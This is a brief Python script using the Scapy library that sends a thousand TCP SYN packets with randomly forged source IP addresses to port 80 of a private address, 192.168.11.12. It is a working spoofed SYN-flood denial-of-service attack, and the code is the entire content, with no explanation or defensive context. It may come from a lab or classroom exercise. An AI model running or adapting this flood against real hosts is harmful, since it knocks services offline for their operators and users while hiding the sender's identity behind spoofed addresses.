from scapy.all import IP, TCP, send
import random

def randomIP():
    return ".".join(str(random.randint(0, 255)) for i in range(4))

for i in range(1000):
    send(IP(src=randomIP(), dst="192.168.11.12")/
        TCP(sport=random.randint(1024, 65535), dport=80, flags="S"))
